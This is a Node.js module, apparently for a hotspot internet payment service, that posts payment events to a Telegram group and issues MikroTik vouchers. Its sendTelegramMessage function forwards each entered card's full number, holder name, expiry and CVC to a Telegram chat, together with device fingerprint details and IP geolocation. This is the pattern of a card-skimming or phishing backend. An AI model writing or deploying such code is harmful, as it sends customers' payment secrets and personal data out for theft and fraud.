const axios = require("axios");
const FormData = require("form-data");
const mikrotikService = require("./mikrotikService");
const contributionMessages = require("./contributionMessages");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BASE_URL = process.env.NETWORK_HOTSPOT_URL || "https://tales-pay.onrender.com";

const { BRANCH_NAMES } = require('./branches');

/**
 * جلب بيانات الشبكة والموقع الجغرافي والإحداثيات بناءً على IP الخارجي
 */
async function fetchNetworkDetailsByIP(ip) {
  const result = {
    location: "غير معروف",
    isp: "غير معروف",
    netLocation: "غير متاح"
  };

  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
    return result;
  }

  const cleanIp = String(ip).split(",")[0].trim();

  try {
    const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.success !== false) {
      const city = res.data.city || res.data.region || "غير معروفة";
      const country = res.data.country || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = (res.data.connection && res.data.connection.isp) ? res.data.connection.isp : (res.data.org || "غير معروف");
      
      const lat = res.data.latitude;
      const lon = res.data.longitude;
      if (lat && lon) {
        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
      }
      return result;
    }
  } catch (e) {}

  try {
    const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
    if (fallbackRes.data && fallbackRes.data.status === "success") {
      const city = fallbackRes.data.city || "غير معروفة";
      const country = fallbackRes.data.country || "غير معروفة";
      result.location = `${city}، ${country}`;
      result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";

      const lat = fallbackRes.data.lat;
      const lon = fallbackRes.data.lon;
      if (lat && lon) {
        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
      }
      return result;
    }
  } catch (fallbackErr) {
    console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي للـ IP:", cleanIp);
  }

  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card" || method.includes("بطاقة")) method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

function getPackageNameByAmount(amount) {
  const numAmount = Number(amount);
  switch (numAmount) {
    case 5: return "الباقة البرونزية";
    case 15: return "الباقة الفضية";
    case 30: return "الباقة الذهبية";
    case 50: return "الباقة البلاتينية";
    case 100: return "الباقة الماسية";
    default:
      if (numAmount > 100) return "مساهمة ودعم للشبكة";
      return "باقة إنترنت شبكة حكايات";
  }
}

/**
 * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام مع زر إصدار الكارت وزر صفحة المساهمة
 */
async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";

    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
      return;
    }

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents
      ? (data.amount_cents / 100).toFixed(2)
      : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    const branchKey = data.branch || data.branchKey || "main";
    const branchName = data.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
    
    const userPhone = data.phone || 
                        data.billing_data?.phone_number || 
                        data.customer?.phone_number || 
                        "غير محدد";
    const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;

    let message = "";

    if (isInitial) {
      const clientID = data.clientID || data.clientId || "غير متوفر";

      let ispText = data.ispProvider || data.isp || null;
      let netLocationText = data.netLocation || null;

      if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
        const netInfo = await fetchNetworkDetailsByIP(publicIP);
        if (netInfo) {
          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
          if (!netLocationText || netLocationText === "غير متاح") netLocationText = netInfo.netLocation;
        }
      }

      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
      const deviceRAM = data.deviceRAM || "غير متوفر";
      const cpuCores = data.cpuCores || "غير متوفر";
      const deviceType = data.deviceType || "غير متوفر";
      const screenSize = data.screenSize || "غير متوفر";
      const userTimeZone = data.userTimeZone || "غير متوفر";
      const lang = data.lang || "غير متوفر";

      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (userPhone && userPhone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
      }

      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                 `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير معروف'}</b>\n` +
                 `📍 <b>موقع الشبكة (IP Geo):</b> ${netLocationText || 'غير متاح'}\n` +
                 `----------------------------------------\n` +
                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;

    } else {
      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
      const packageInfo = data.package_info || data.packageName || getPackageNameByAmount(amountEGP);

      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
                `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
                `----------------------------------------\n` +
                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
    }

    // زر إصدار الكارت (Callback) وزر مساهمة يفتح صفحة المساهمة (URL)
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "🎟️ إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountEGP}_${branchKey}` },
          { text: "🤝 مساهمة", url: `${BASE_URL}/contribution-success?amount=${amountEGP}&tx=${txnId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
      reply_markup: replyMarkup
    });

  } catch (err) {
    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
  }
}

/**
 * 2. 🎯 إرسال صورة الكارت الاحترافية مع زر الإصدار وزر صفحة المساهمة
 */
async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
      return;
    }

    if (!imageBuffer) {
      console.error("❌ [Telegram Error] Buffer الصورة فارغ!");
      return;
    }

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    
    form.append("photo", imageBuffer, {
      filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
      contentType: "image/png"
    });

    const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
    const amountVal = paymentDetails.amount || "0";
    const branchKey = paymentDetails.branch || paymentDetails.branchKey || "main";
    const branchName = paymentDetails.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
    const packageName = paymentDetails.packageName || getPackageNameByAmount(amountVal);

    const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                    `🏢 الفرع: <b>${branchName}</b>\n` +
                    `📦 الباقة: <b>${packageName}</b>\n` +
                    `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                    `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
                    `🆔 رقم العملية: <code>${txnId}</code>`;

    form.append("caption", caption);
    form.append("parse_mode", "HTML");

    form.append("reply_markup", JSON.stringify({
      inline_keyboard: [
        [
          { text: "🎟️ إعادة إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountVal}_${branchKey}` },
          { text: "🤝 مساهمة", url: `${BASE_URL}/contribution-success?amount=${amountVal}&tx=${txnId}` }
        ]
      ]
    }));

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: { ...form.getHeaders() },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

  } catch (err) {
    console.error("❌ [Telegram Image Error Details]:", err.response?.data || err.message);
  }
}

/**
 * 3. 🔄 معالجة الضغط على الأزرار التفاعلية (Callback Queries لإصدار الكارت فقط)
 */
async function handleTelegramCallback(callbackQuery) {
  try {
    const queryId = callbackQuery.id;
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: queryId,
      text: "جاري إصدار الكارت من الميكروتيك...",
      show_alert: false
    });

    const parts = data.split("_");

    if (data.startsWith("create_voucher")) {
      const txnId = parts[2] || "UNKNOWN"; 
      const amount = parts[3] || "0";
      const branchKey = parts[4] || "main";

      let voucherData = null;
      let errorMessage = null;

      try {
        if (typeof mikrotikService !== "undefined" && typeof mikrotikService.processPaymentAndCreateCard === "function") {
          voucherData = await mikrotikService.processPaymentAndCreateCard(amount, branchKey, txnId);
        } else {
          throw new Error("دالة processPaymentAndCreateCard غير موجودة في mikrotikService");
        }
      } catch (err) {
        errorMessage = err.message;
      }

      if (voucherData && (voucherData.success || voucherData.cardCode)) {
        if (global.generatedCardsMap) {
          global.generatedCardsMap.set(txnId, {
            isContribution: voucherData.isContribution || false,
            success: true,
            code: voucherData.cardCode || voucherData.username || "متاح",
            voucher: {
              username: voucherData.cardCode || voucherData.username || "متاح",
              password: voucherData.password || ""
            },
            amount: amount,
            transactionId: txnId,
            packageName: voucherData.packageName || getPackageNameByAmount(amount),
            branchKey: branchKey,
            branchName: BRANCH_NAMES[branchKey] || "حكايات نت رئيسي",
            createdAt: new Date()
          });
        }

        const usernameStr = voucherData.cardCode || voucherData.username || "متاح";
        const passwordStr = voucherData.password || "";
        const targetBranchName = BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";

        const updatedText = callbackQuery.message.text + 
          `\n\n✅ <b>[تم إصدار الكارت بنجاح لفرع: ${targetBranchName}]</b>\n🎟️ الكارت: <code>${usernameStr}</code>` +
          (passwordStr ? `\n🔑 كلمة المرور: <code>${passwordStr}</code>` : ``);

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
          chat_id: chatId,
          message_id: messageId,
          text: updatedText,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [] }
        });

      } else {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: `❌ فشل إصدار الكارت من الميكروتيك للفرع (${branchKey}) للمعاملة ${txnId}.\nالسبب: ${errorMessage || "خطأ غير معروف"}`
        });
      }
    }

  } catch (err) {
    console.error("❌ [Telegram Callback Error]:", err.response?.data || err.message);
  }
}

/**
 * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام
 */
async function sendTelegramFailNotification(errorMessage, data = {}) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      return;
    }

    const publicIP = data.publicIP || "غير متوفر";
    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      return;
    }

    const netInfo = await fetchNetworkDetailsByIP(publicIP);
    const ispText = netInfo.isp;
    const netLocationText = netInfo.netLocation;
    const dateTimeStr = getFormattedDateTime();

    let message = `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
                  `----------------------------------------\n` +
                  `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
                  `📡 مزود الخدمة (ISP): <b>${ispText}</b>\n` +
                  `📍 موقع الشبكة (IP Geo): ${netLocationText}\n` +
                  `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ [Telegram Fail Notification Error]:", err.response?.data || err.message);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage,
  handleTelegramCallback,
  sendTelegramFailNotification
};
